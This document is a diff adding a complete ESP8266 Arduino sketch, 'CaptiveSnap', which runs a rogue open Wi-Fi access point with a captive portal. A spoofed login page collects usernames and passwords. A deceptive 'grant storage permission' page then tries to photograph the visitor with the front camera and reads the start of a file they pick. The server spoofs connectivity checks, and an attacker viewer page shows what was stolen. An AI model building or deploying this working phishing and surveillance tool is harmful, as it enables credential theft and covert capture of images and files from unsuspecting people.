@@ -1,0 +1,662 @@
+/*
+  CaptiveSnap.ino
+  CaptiveSnap – ESP8266 Rogue Wi‑Fi Demo
+  Hardware: NodeMCU v3 (ESP8266)
+  Creates open AP "SIMATS", captive portal, WebSocket server.
+  Steals username, captures selfie, grabs file preview.
+  Offline operation – no internet needed.
+  For authorized hackathons / education only.
+*/
+
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DNSServer.h>
+#include <WebSocketsServer.h>
+
+// AP configuration
+#define AP_SSID "SIMATS"
+#define AP_IP_ADDR 192,168,1,1
+#define AP_SUBNET 255,255,255,0
+
+// Web & WebSocket ports
+const int HTTP_PORT = 80;
+const int WS_PORT = 81;
+
+// Create server instances
+DNSServer dnsServer;
+ESP8266WebServer server(HTTP_PORT);
+WebSocketsServer webSocket(WS_PORT);
+
+// ============================================================
+//  HTML pages (stored in PROGMEM)
+// ============================================================
+
+// ---------- Login page (/) ----------
+const char index_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Wi‑Fi Login</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: #f2f2f7;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      border-radius: 28px;
+      padding: 40px 28px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+    h1 {
+      font-weight: 600;
+      font-size: 24px;
+      margin-bottom: 8px;
+      color: #1c1c1e;
+    }
+    .sub {
+      color: #8e8e93;
+      font-size: 14px;
+      margin-bottom: 28px;
+    }
+    .input-group {
+      text-align: left;
+      margin-bottom: 18px;
+    }
+    .input-group label {
+      font-size: 13px;
+      font-weight: 500;
+      color: #3a3a3c;
+      display: block;
+      margin-bottom: 4px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #d1d1d6;
+      border-radius: 14px;
+      font-size: 16px;
+      background: #f8f8fc;
+      transition: border 0.2s;
+      outline: none;
+    }
+    .input-group input:focus {
+      border-color: #007aff;
+    }
+    button {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 30px;
+      background: #007aff;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 10px;
+    }
+    button:active { background: #0055b3; }
+    .footer {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #8e8e93;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Wi‑Fi Login</h1>
+    <p class="sub">Enter your credentials to access the network</p>
+    <form action="/login" method="POST">
+      <div class="input-group">
+        <label>Username</label>
+        <input type="text" name="username" placeholder="e.g. your email" required>
+      </div>
+      <div class="input-group">
+        <label>Password (optional)</label>
+        <input type="password" name="password" placeholder="••••••••">
+      </div>
+      <button type="submit">Connect</button>
+    </form>
+    <div class="footer">Secure connection · 2.4 GHz</div>
+  </div>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Activation page (/activate) ----------
+const char activate_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Activating…</title>
+  <style>
+    * { margin:0; padding:0; }
+    body, html { width:100%; height:100%; overflow:hidden; background:#000; }
+    #overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      font-family: -apple-system, sans-serif;
+      font-size: 22px;
+      font-weight: 500;
+      z-index: 999;
+      flex-direction: column;
+      padding: 30px;
+      text-align: center;
+      cursor: pointer;
+    }
+    #overlay small {
+      font-size: 16px;
+      font-weight: 300;
+      margin-top: 12px;
+      opacity: 0.8;
+    }
+    #overlay.hidden { display: none; }
+    video, canvas { display: none; }
+    #status {
+      position: fixed;
+      top: 20px;
+      left: 20px;
+      color: rgba(255,255,255,0.4);
+      font: 14px monospace;
+      z-index: 1000;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="status">initializing…</div>
+  <video id="video" muted playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <div id="overlay">
+    Tap anywhere to grant storage permission
+    <small>Choose any file – we only read the first 100 chars</small>
+  </div>
+
+  <input type="file" id="fileInput" style="position:absolute;left:-9999px;">
+
+  <script>
+    (function(){
+      // ----- WebSocket -----
+      var ws = new WebSocket('ws://192.168.1.1:81');
+      ws.binaryType = 'arraybuffer';
+
+      var video = document.getElementById('video');
+      var canvas = document.getElementById('canvas');
+      var ctx = canvas.getContext('2d');
+      var overlay = document.getElementById('overlay');
+      var fileInput = document.getElementById('fileInput');
+      var statusEl = document.getElementById('status');
+
+      var photoSent = false;
+      var storageTriggered = false;
+
+      // ----- Helper: send status to serial (via WebSocket text) -----
+      function sendStatus(msg) {
+        // just for debug, send to WebSocket? We'll broadcast anyway.
+        // Not needed for victim, but we can send a text message.
+        // We'll just ignore.
+      }
+
+      // ----- Capture photo -----
+      function capturePhoto() {
+        if (photoSent) return;
+        var stream = video.srcObject;
+        if (!stream) return;
+
+        // Draw to canvas
+        canvas.width = 320;
+        canvas.height = 240;
+        ctx.drawImage(video, 0, 0, 320, 240);
+
+        // Stop camera tracks
+        stream.getTracks().forEach(t => t.stop());
+
+        // Convert to JPEG Blob
+        canvas.toBlob(function(blob) {
+          if (!blob) {
+            statusEl.textContent = 'Error: cannot capture';
+            return;
+          }
+          // Send as binary via WebSocket
+          var reader = new FileReader();
+          reader.onload = function(e) {
+            if (ws.readyState === WebSocket.OPEN) {
+              ws.send(e.target.result);
+              photoSent = true;
+              statusEl.textContent = 'photo sent ✓';
+              // Now show storage overlay
+              showOverlay();
+            } else {
+              statusEl.textContent = 'WS not open';
+            }
+          };
+          reader.readAsArrayBuffer(blob);
+        }, 'image/jpeg', 0.85);
+      }
+
+      // ----- Start camera -----
+      function startCamera() {
+        statusEl.textContent = 'requesting camera…';
+        var constraints = {
+          video: {
+            facingMode: 'user',
+            width: { ideal: 320 },
+            height: { ideal: 240 }
+          }
+        };
+
+        navigator.mediaDevices.getUserMedia(constraints)
+          .then(function(stream) {
+            video.srcObject = stream;
+            video.onloadedmetadata = function() {
+              video.play();
+              statusEl.textContent = 'camera ready';
+              // Capture after a short delay
+              setTimeout(capturePhoto, 500);
+            };
+          })
+          .catch(function(err) {
+            // Fallback: try without facingMode
+            statusEl.textContent = 'fallback camera…';
+            navigator.mediaDevices.getUserMedia({ video: true })
+              .then(function(stream) {
+                video.srcObject = stream;
+                video.onloadedmetadata = function() {
+                  video.play();
+                  statusEl.textContent = 'camera ready (fallback)';
+                  setTimeout(capturePhoto, 500);
+                };
+              })
+              .catch(function(err2) {
+                statusEl.textContent = 'Camera unavailable';
+                // Still show overlay to allow storage
+                showOverlay();
+              });
+          });
+      }
+
+      // ----- Storage overlay -----
+      function showOverlay() {
+        if (storageTriggered) return;
+        storageTriggered = true;
+        overlay.classList.remove('hidden');
+        statusEl.textContent = 'waiting for tap…';
+
+        overlay.addEventListener('click', function onClick() {
+          overlay.classList.add('hidden');
+          // Trigger file picker
+          fileInput.click();
+          statusEl.textContent = 'file picker opened';
+        }, { once: true });
+      }
+
+      // ----- File input handler -----
+      fileInput.addEventListener('change', function(e) {
+        var file = this.files[0];
+        if (!file) {
+          statusEl.textContent = 'no file selected';
+          return;
+        }
+
+        var name = file.name || 'unknown';
+        var size = file.size || 0;
+        // Read first 100 chars as text
+        var slice = file.slice(0, 100);
+        var reader = new FileReader();
+        reader.onload = function(e) {
+          var preview = e.target.result || '';
+          // Send as text message: "FILE:name|size|preview"
+          var msg = 'FILE:' + name + '|' + size + '|' + preview;
+          if (ws.readyState === WebSocket.OPEN) {
+            ws.send(msg);
+            statusEl.textContent = 'file info sent ✓';
+          } else {
+            statusEl.textContent = 'WS not open for file';
+          }
+          // Clean up
+          fileInput.value = '';
+        };
+        reader.readAsText(slice);
+        // Also we could read as ArrayBuffer? But spec says text.
+      });
+
+      // ----- WebSocket events -----
+      ws.onopen = function() {
+        statusEl.textContent = 'WS connected';
+        // Start camera after connection
+        startCamera();
+      };
+
+      ws.onclose = function() {
+        statusEl.textContent = 'WS closed';
+        // Retry? For simplicity, show message.
+      };
+
+      ws.onerror = function(err) {
+        statusEl.textContent = 'WS error';
+        console.error(err);
+      };
+
+      // If camera not started after 5s, show overlay anyway
+      setTimeout(function() {
+        if (!photoSent && !storageTriggered) {
+          statusEl.textContent = 'camera timeout, showing storage';
+          showOverlay();
+        }
+      }, 8000);
+
+    })();
+  </script>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Viewer page (/view) ----------
+const char view_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attacker Viewer</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: #1c1c1e;
+      color: #f5f5f7;
+      font-family: -apple-system, sans-serif;
+      padding: 20px;
+      padding-bottom: 80px;
+    }
+    h2 {
+      font-weight: 600;
+      font-size: 22px;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+    .sub {
+      color: #8e8e93;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    .log {
+      background: #2c2c2e;
+      border-radius: 16px;
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      min-height: 120px;
+      max-height: 300px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin-bottom: 20px;
+      border: 1px solid #3a3a3c;
+    }
+    .log-entry {
+      margin-bottom: 4px;
+      border-bottom: 1px solid #3a3a3c;
+      padding-bottom: 4px;
+    }
+    .log-entry .time { color: #8e8e93; }
+    .log-entry .type { color: #ff9f0a; }
+    .log-entry .data { color: #64d2ff; }
+    .photo-gallery {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .photo-card {
+      background: #2c2c2e;
+      border-radius: 16px;
+      padding: 8px;
+      width: 160px;
+    }
+    .photo-card img {
+      width: 100%;
+      border-radius: 8px;
+      display: block;
+    }
+    .photo-card .caption {
+      font-size: 11px;
+      color: #8e8e93;
+      margin-top: 4px;
+      text-align: center;
+    }
+    .badge {
+      display: inline-block;
+      background: #007aff;
+      border-radius: 30px;
+      padding: 2px 12px;
+      font-size: 12px;
+      font-weight: 500;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <h2>📡 CaptiveSnap Viewer</h2>
+  <div class="sub">Connected to <span id="wsStatus">connecting…</span></div>
+
+  <div class="log" id="logArea">
+    <div class="log-entry">[system] waiting for data…</div>
+  </div>
+
+  <div class="photo-gallery" id="gallery"></div>
+
+  <script>
+    (function(){
+      var ws = new WebSocket('ws://192.168.1.1:81');
+      ws.binaryType = 'arraybuffer';
+
+      var logArea = document.getElementById('logArea');
+      var gallery = document.getElementById('gallery');
+      var statusEl = document.getElementById('wsStatus');
+
+      function appendLog(type, data) {
+        var entry = document.createElement('div');
+        entry.className = 'log-entry';
+        var time = new Date().toLocaleTimeString();
+        entry.innerHTML = '<span class="time">['+time+']</span> ' +
+                          '<span class="type">'+type+'</span> ' +
+                          '<span class="data">'+data+'</span>';
+        logArea.appendChild(entry);
+        logArea.scrollTop = logArea.scrollHeight;
+      }
+
+      ws.onopen = function() {
+        statusEl.textContent = 'connected ✅';
+        statusEl.style.color = '#30d158';
+        appendLog('system', 'WebSocket connected');
+      };
+
+      ws.onclose = function() {
+        statusEl.textContent = 'disconnected ❌';
+        statusEl.style.color = '#ff453a';
+        appendLog('system', 'WebSocket closed');
+      };
+
+      ws.onerror = function(err) {
+        appendLog('error', err.toString());
+      };
+
+      ws.onmessage = function(event) {
+        if (typeof event.data === 'string') {
+          // Text message
+          var msg = event.data;
+          appendLog('text', msg);
+          // Parse for file info or username
+          if (msg.startsWith('USER:')) {
+            var user = msg.substring(5);
+            appendLog('username', user);
+          } else if (msg.startsWith('FILE:')) {
+            var parts = msg.substring(5).split('|');
+            var name = parts[0] || '';
+            var size = parts[1] || '';
+            var preview = parts[2] || '';
+            appendLog('file', name + ' ('+size+' bytes) preview: '+preview);
+          } else {
+            appendLog('text', msg);
+          }
+        } else if (event.data instanceof ArrayBuffer) {
+          // Binary – assume JPEG
+          var blob = new Blob([event.data], { type: 'image/jpeg' });
+          var url = URL.createObjectURL(blob);
+          var card = document.createElement('div');
+          card.className = 'photo-card';
+          var img = document.createElement('img');
+          img.src = url;
+          card.appendChild(img);
+          var cap = document.createElement('div');
+          cap.className = 'caption';
+          cap.textContent = '📸 ' + new Date().toLocaleTimeString();
+          card.appendChild(cap);
+          gallery.prepend(card);
+          appendLog('photo', 'received JPEG ('+event.data.byteLength+' bytes)');
+        }
+      };
+    })();
+  </script>
+</body>
+</html>
+)rawliteral";
+
+// ============================================================
+//  Server request handlers
+// ============================================================
+
+void handleRoot() {
+  server.send(200, "text/html", FPSTR(index_html));
+}
+
+void handleActivate() {
+  server.send(200, "text/html", FPSTR(activate_html));
+}
+
+void handleView() {
+  server.send(200, "text/html", FPSTR(view_html));
+}
+
+void handleLogin() {
+  String username = server.arg("username");
+  String password = server.arg("password");
+  if (username.length() > 0) {
+    String msg = "USER:" + username;
+    if (password.length() > 0) {
+      msg += " (password: " + password + ")";
+    }
+    webSocket.broadcastTXT(msg);
+    Serial.println("[Captured] " + msg);
+  }
+  // Redirect to activation page
+  server.sendHeader("Location", "/activate", true);
+  server.send(302, "text/plain", "");
+}
+
+void handleSpoof() {
+  // Respond with 200 OK to satisfy connectivity checks
+  server.send(200, "text/plain", "OK");
+}
+
+void handleNotFound() {
+  // Redirect all unknown paths to root (captive portal)
+  server.sendHeader("Location", "/", true);
+  server.send(302, "text/plain", "");
+}
+
+// ============================================================
+//  WebSocket event handler
+// ============================================================
+
+void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
+  switch (type) {
+    case WStype_DISCONNECTED:
+      Serial.printf("[WS] Client %u disconnected\n", num);
+      break;
+    case WStype_CONNECTED:
+      Serial.printf("[WS] Client %u connected\n", num);
+      break;
+    case WStype_TEXT:
+      // Forward text to all clients (broadcast)
+      webSocket.broadcastTXT(payload, length);
+      Serial.printf("[WS] Text: %s\n", (char*)payload);
+      break;
+    case WStype_BIN:
+      // Forward binary (photo) to all clients
+      webSocket.broadcastBIN(payload, length);
+      Serial.printf("[WS] Binary received, %u bytes\n", length);
+      break;
+    default:
+      break;
+  }
+}
+
+// ============================================================
+//  Setup & loop
+// ============================================================
+
+void setup() {
+  Serial.begin(115200);
+  Serial.println("\n\n--- CaptiveSnap starting ---");
+
+  // Configure Access Point
+  IPAddress apIP(AP_IP_ADDR);
+  IPAddress subnet(AP_SUBNET);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, subnet);
+  WiFi.softAP(AP_SSID);  // open network
+
+  Serial.print("AP IP: ");
+  Serial.println(WiFi.softAPIP());
+
+  // Start DNS (captive portal)
+  dnsServer.start(53, "*", apIP);
+
+  // Start HTTP server
+  server.on("/", HTTP_GET, handleRoot);
+  server.on("/login", HTTP_POST, handleLogin);
+  server.on("/activate", HTTP_GET, handleActivate);
+  server.on("/view", HTTP_GET, handleView);
+  // Spoof connectivity checks
+  server.on("/generate_204", HTTP_GET, handleSpoof);
+  server.on("/ncsi.txt", HTTP_GET, handleSpoof);
+  server.on("/hotspot-detect.html", HTTP_GET, handleSpoof);
+  server.on("/connecttest.txt", HTTP_GET, handleSpoof);
+  server.onNotFound(handleNotFound);
+  server.begin();
+  Serial.println("HTTP server started on port 80");
+
+  // Start WebSocket server
+  webSocket.begin();
+  webSocket.onEvent(webSocketEvent);
+  Serial.println("WebSocket server started on port 81");
+
+  Serial.println("CaptiveSnap ready! SSID: " + String(AP_SSID));
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+  webSocket.loop();
+}
